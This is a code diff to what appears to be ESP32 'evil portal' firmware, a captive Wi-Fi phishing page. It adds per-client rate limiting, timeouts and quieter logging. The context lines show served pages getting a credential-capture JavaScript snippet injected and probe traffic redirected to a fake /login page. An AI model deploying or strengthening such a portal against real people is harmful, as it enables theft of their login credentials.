@@ -232,6 +232,93 @@ static int64_t s_portal_log_window_started_us = 0;
 static unsigned int s_portal_log_requests_in_window = 0;
 static int64_t s_portal_last_flush_us = 0;
 
+// Per-client HTTP rate limiting for all portal requests (not just /api/log).
+// This catches floods directed at /login, captive probes, and static assets.
+#define PORTAL_HTTP_RL_TABLE_SIZE 8
+#define PORTAL_HTTP_RL_BURST 8
+#define PORTAL_HTTP_RL_REFILL_US (100 * 1000)  // 100 ms
+#define PORTAL_HTTP_RL_REFILL_TOKENS 1
+
+typedef struct {
+    uint32_t src_addr;
+    uint8_t tokens;
+    int64_t last_refill_us;
+} portal_http_rl_entry_t;
+
+static portal_http_rl_entry_t s_portal_http_rl_table[PORTAL_HTTP_RL_TABLE_SIZE] = {0};
+
+static bool portal_http_rate_limit_allow(uint32_t src_addr) {
+    const int64_t now = esp_timer_get_time();
+    portal_http_rl_entry_t *slot = NULL;
+    portal_http_rl_entry_t *oldest = NULL;
+    int64_t oldest_time = INT64_MAX;
+
+    for (int i = 0; i < PORTAL_HTTP_RL_TABLE_SIZE; i++) {
+        if (s_portal_http_rl_table[i].src_addr == src_addr) {
+            slot = &s_portal_http_rl_table[i];
+            break;
+        }
+        if (s_portal_http_rl_table[i].src_addr == 0) {
+            if (!slot) slot = &s_portal_http_rl_table[i];
+        } else if (s_portal_http_rl_table[i].last_refill_us < oldest_time) {
+            oldest_time = s_portal_http_rl_table[i].last_refill_us;
+            oldest = &s_portal_http_rl_table[i];
+        }
+    }
+
+    if (!slot) {
+        slot = oldest;
+        slot->src_addr = src_addr;
+        slot->tokens = 0;
+    }
+
+    if (slot->src_addr == 0) {
+        slot->src_addr = src_addr;
+        slot->tokens = PORTAL_HTTP_RL_BURST;
+        slot->last_refill_us = now;
+    }
+
+    int64_t elapsed = now - slot->last_refill_us;
+    if (elapsed >= PORTAL_HTTP_RL_REFILL_US) {
+        int64_t refills = elapsed / PORTAL_HTTP_RL_REFILL_US;
+        int64_t new_tokens = (int64_t)slot->tokens + refills * PORTAL_HTTP_RL_REFILL_TOKENS;
+        if (new_tokens > PORTAL_HTTP_RL_BURST) new_tokens = PORTAL_HTTP_RL_BURST;
+        slot->tokens = (uint8_t)new_tokens;
+        slot->last_refill_us = now;
+    }
+
+    if (slot->tokens > 0) {
+        slot->tokens--;
+        return true;
+    }
+    return false;
+}
+
+static uint32_t portal_get_client_addr(httpd_req_t *req) {
+    int sock = httpd_req_to_sockfd(req);
+    if (sock < 0) return 0;
+    struct sockaddr_storage peer_addr;
+    socklen_t peer_len = sizeof(peer_addr);
+    if (getpeername(sock, (struct sockaddr *)&peer_addr, &peer_len) != 0) {
+        return 0;
+    }
+    if (peer_addr.ss_family == AF_INET) {
+        return ((struct sockaddr_in *)&peer_addr)->sin_addr.s_addr;
+    }
+#if LWIP_IPV6
+    if (peer_addr.ss_family == AF_INET6) {
+        struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)&peer_addr;
+        if (IN6_IS_ADDR_V4MAPPED(addr6->sin6_addr.s6_addr)) {
+            return PP_HTONL(LWIP_MAKEU32(addr6->sin6_addr.s6_addr[12],
+                                         addr6->sin6_addr.s6_addr[13],
+                                         addr6->sin6_addr.s6_addr[14],
+                                         addr6->sin6_addr.s6_addr[15]));
+        }
+    }
+#endif
+    return 0;
+}
+
 static void portal_flush_buffers_to_sd(void);
 
 static bool portal_capture_request_allowed(void) {
@@ -468,7 +555,9 @@ static inline bool stream_buf_lock(void) {
         g_stream_buf_mutex = xSemaphoreCreateMutex();
         if (g_stream_buf_mutex == NULL) return false;
     }
-    if (xSemaphoreTake(g_stream_buf_mutex, portMAX_DELAY) != pdTRUE) return false;
+    // Bounded wait: prevents one stalled client from monopolizing the shared
+    // streaming buffer when the portal is under heavy load.
+    if (xSemaphoreTake(g_stream_buf_mutex, pdMS_TO_TICKS(3000)) != pdTRUE) return false;
     if (g_stream_buf == NULL) {
 #if CONFIG_SPIRAM
         g_stream_buf = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
@@ -1201,23 +1290,32 @@ esp_err_t done_handler(httpd_req_t *req) {
     return ESP_OK;
 }
 esp_err_t portal_handler(httpd_req_t *req) {
-    printf("Client requested URL: %s\n", req->uri);
-    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    // Rate-limit /login and other directly-served portal pages too.
+    uint32_t client_addr = portal_get_client_addr(req);
+    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
+        return ESP_OK;
+    }
+
+    ESP_LOGD(TAG, "Client requested URL: %s", req->uri);
+    ESP_LOGD(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
     // Debug buffer state
-    ESP_LOGI(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s", 
+    ESP_LOGD(TAG, "HTML buffer check: html_buffer=%p, html_buffer_size=%zu, use_html_buffer=%s",
              html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
 
     // Prefer buffered HTML over default embedded portal when available
     if (html_buffer != NULL && html_buffer_size > 0) {
-        ESP_LOGI(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
+        ESP_LOGD(TAG, "Using buffered HTML (size: %zu bytes)", html_buffer_size);
         httpd_resp_set_type(req, "text/html");
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked"); // Set chunked response
         httpd_resp_send_chunk(req, html_buffer, html_buffer_size);
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
-        ESP_LOGI(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
+        ESP_LOGD(TAG, "Served HTML from buffer (size: %zu bytes) with JS injection.", html_buffer_size);
+        ESP_LOGD(TAG, "Free heap after serving buffer: %" PRIu32 " bytes", esp_get_free_heap_size());
         return ESP_OK;
     }
 
@@ -1225,13 +1323,13 @@ esp_err_t portal_handler(httpd_req_t *req) {
     // This avoids re-mounting the SD from the HTTP server task where SPI bus contention
     // with the display causes the mount to fail and returns an error page to the client.
     if (portal_file_cache != NULL && portal_file_cache_size > 0) {
-        ESP_LOGI(TAG, "Using pre-loaded portal file cache (%zu bytes)", portal_file_cache_size);
+        ESP_LOGD(TAG, "Using pre-loaded portal file cache (%zu bytes)", portal_file_cache_size);
         httpd_resp_set_type(req, "text/html");
         httpd_resp_set_hdr(req, "Transfer-Encoding", "chunked");
         httpd_resp_send_chunk(req, portal_file_cache, portal_file_cache_size);
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served portal from file cache with JS injection.");
+        ESP_LOGD(TAG, "Served portal from file cache with JS injection.");
         return ESP_OK;
     }
 
@@ -1242,8 +1340,8 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send_chunk(req, default_portal_html, strlen(default_portal_html));
         httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         httpd_resp_send_chunk(req, NULL, 0);
-        ESP_LOGI(TAG, "Served default embedded portal with JS injection.");
-        ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        ESP_LOGD(TAG, "Served default embedded portal with JS injection.");
+        ESP_LOGD(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return ESP_OK;
     }
 
@@ -1277,7 +1375,7 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send(req, error_message, strlen(error_message));
     }
 
-    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    ESP_LOGD(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 esp_err_t get_log_handler(httpd_req_t *req) {
@@ -1407,21 +1505,31 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 }
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
-    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    // Enforce a lightweight per-client HTTP rate limit early, before any heap
+    // allocations or expensive portal serving work.
+    uint32_t client_addr = portal_get_client_addr(req);
+    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
+        httpd_resp_set_hdr(req, "Connection", "close");
+        httpd_resp_set_status(req, "429 Too Many Requests");
+        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
+        return ESP_OK;
+    }
+
+    ESP_LOGD(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
     char *req_host = get_host_from_req(req);
     if (req_host) {
-        ESP_LOGI(TAG, "Redirect handler Host header: %s", req_host);
+        ESP_LOGD(TAG, "Redirect handler Host header: %s", req_host);
         free(req_host);
     } else {
-        ESP_LOGI(TAG, "Redirect handler: Host header not present");
+        ESP_LOGD(TAG, "Redirect handler: Host header not present");
     }
     size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent");
     if (ua_len > 0 && ua_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
         char *ua = malloc(ua_len + 1);
         if (ua) {
             if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len + 1) == ESP_OK) {
-                ESP_LOGI(TAG, "Redirect handler User-Agent: %s", ua);
+                ESP_LOGD(TAG, "Redirect handler User-Agent: %s", ua);
             }
             free(ua);
         }
@@ -1449,7 +1557,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         esp_err_t r = portal_handler(req);
-        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
         return r;
     }
     // minimal logging for captive probe
@@ -1467,8 +1575,8 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     if (is_html && html_buffer != NULL && html_buffer_size > 0) {
         httpd_resp_set_hdr(req, "Cache-Control", "no-store");
         esp_err_t r = portal_handler(req);
-        ESP_LOGI(TAG, "Served HTML URL via buffer portal for URI: %s", u);
-        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
+        ESP_LOGD(TAG, "Served HTML URL via buffer portal for URI: %s", u);
+        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
         return r;
     }
 
@@ -1486,7 +1594,7 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     httpd_resp_set_status(req, "302 Found");
     httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
     httpd_resp_send(req, NULL, 0);
-    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
@@ -1546,6 +1654,10 @@ httpd_handle_t start_portal_webserver(void) {
     config.ctrl_port = 32769;
     config.lru_purge_enable = true;
     config.stack_size = 4096;
+    // Short socket timeouts so a flooded or stalled client cannot pin a socket
+    // for long.  These apply to the portal server only.
+    config.recv_wait_timeout = 3;
+    config.send_wait_timeout = 3;
 #if CONFIG_FREERTOS_UNICORE
     config.core_id = 0;
 #endif
@@ -1693,6 +1805,7 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     s_portal_log_window_started_us = 0;
     s_portal_log_requests_in_window = 0;
     s_portal_last_flush_us = 0;
+    memset(s_portal_http_rl_table, 0, sizeof(s_portal_http_rl_table));
     portal_sd_jit_mounted = false;
     portal_display_suspended = false;
     // jit mount sd for somethingsomething template only
